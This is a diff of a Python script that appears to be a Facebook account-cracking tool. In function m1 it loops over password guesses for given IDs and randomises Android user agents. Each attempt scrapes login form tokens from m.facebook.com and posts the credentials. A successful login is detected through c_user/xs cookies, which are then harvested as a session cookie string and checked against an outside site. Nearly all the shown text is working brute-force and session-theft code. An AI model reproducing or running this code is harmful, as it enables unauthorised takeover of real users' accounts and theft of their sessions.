@@ -1050,29 +1050,29 @@ def m1(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            response = session.get('https://m.facebook.com/?locale2=en_GB').text
+            free_fb = session.get('https://m.facebook.com/?locale2=en_GB').text
             info={
-            'fb_dtsg': response.html.find('input[name="fb_dtsg"]', first=True).attrs.get('value', ''),
-            'lsd': response.html.find('input[name="lsd"]', first=True).attrs.get('value', ''),
-            'jazoest': response.html.find('input[name="jazoest"]', first=True).attrs.get('value', ''),
-            'login': response.html.find('input[name="login"]', first=True).attrs.get('value', ''),
-            'persistent': response.html.find('input[name="persistent"]', first=True).attrs.get('value', ''),
+            'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'login': re.search('name="login" value="(.*?)"', str(free_fb)).group(1),
+            'persistent': re.search('name="persistent" value="(.*?)"', str(free_fb)).group(1),
             'email': ids,
             'pass': pas,
-            'source': response.html.find('input[name="source"]', first=True).attrs.get('value', ''),
-            'm_ts': response.html.find('input[name="m_ts"]', first=True).attrs.get('value', ''),
-            'login_attempt': response.html.find('input[name="login_attempt"]', first=True).attrs.get('value', ''),
-            'timestamp': response.html.find('input[name="timestamp"]', first=True).attrs.get('value', ''),
-            'locale': response.html.find('input[name="locale"]', first=True).attrs.get('value', ''),
-            'next': response.html.find('input[name="next"]', first=True).attrs.get('value', ''),
-            'ref': response.html.find('input[name="ref"]', first=True).attrs.get('value', ''),
-            'dpr': response.html.find('input[name="dpr"]', first=True).attrs.get('value', ''),
-            'pl': response.html.find('input[name="pl"]', first=True).attrs.get('value', ''),
-            'id': response.html.find('input[name="id"]', first=True).attrs.get('value', ''),
-            'c_user': response.html.find('input[name="c_user"]', first=True).attrs.get('value', ''),
-            'xs': response.html.find('input[name="xs"]', first=True).attrs.get('value', ''),
-            'data': response.html.find('input[name="data"]', first=True).attrs.get('value', ''),
-            'legacy_id': response.html.find('input[name="legacy_id"]', first=True).attrs.get('value', '')}
+            'source': re.search('name="source" value="(.*?)"', str(free_fb)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'login_attempt': re.search('name="login_attempt" value="(.*?)"', str(free_fb)).group(1),
+            'timestamp': re.search('name="timestamp" value="(.*?)"', str(free_fb)).group(1),
+            'locale': re.search('name="locale" value="(.*?)"', str(free_fb)).group(1),
+            'next': re.search('name="next" value="(.*?)"', str(free_fb)).group(1),
+            'ref': re.search('name="ref" value="(.*?)"', str(free_fb)).group(1),
+            'dpr': re.search('name="dpr" value="(.*?)"', str(free_fb)).group(1),
+            'pl': re.search('name="pl" value="(.*?)"', str(free_fb)).group(1),
+            'id': re.search('name="id" value="(.*?)"', str(free_fb)).group(1),
+            'c_user': re.search('name="c_user" value="(.*?)"', str(free_fb)).group(1),
+            'xs': re.search('name="xs" value="(.*?)"', str(free_fb)).group(1),
+            'data': re.search('name="data" value="(.*?)"', str(free_fb)).group(1),
+            'legacy_id': re.search('name="legacy_id" value="(.*?)"', str(free_fb)).group(1)}
             update={
             'Authority': 'm.facebook.com',
             'Accept': '*/*',
@@ -1097,8 +1097,9 @@ def m1(ids,pwv):
             'X-FB-LSD': 'AVq9MsDYu_k',
             'X-Requested-With': 'XMLHttpRequest',
             'X-Response-Format': 'JSONStream'}
-            login_response = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=info,headers=update).text
-            if 'c_user' in login_response.cookies:
+            session.post('https://m.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=4f68572762725b85380bb3322eb4f56b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&lwv=100',data=info,headers=update).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
